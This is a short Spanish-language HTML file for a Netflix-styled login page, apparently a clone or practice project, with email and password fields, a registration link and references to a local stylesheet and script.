<!DOCTYPE html>
<html lang="es">
 <head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="login.css" />
  <title>Inicio de Sesión - Netflix</title>
  <link rel="icon" href="https://www.edigitalagency.com.au/wp-content/uploads/netflix-logo-circle-png.png" type="image/png">
 </head>
 <body>
  <div class="login-container">
   <form id="login-form">
    <h2>Iniciar Sesión</h2>
    <input type="email" id="email" placeholder="Correo electrónico" required />
    <input type="password" id="password" placeholder="Contraseña" required />
    <button type="submit">Iniciar Sesión</button>
    <p>
     ¿Nuevo en Netflix? <a href="#" id="register-link">Regístrate ahora</a>
    </p>
   </form>
  </div>
  <script src="login.js"></script>
 </body>
</html>
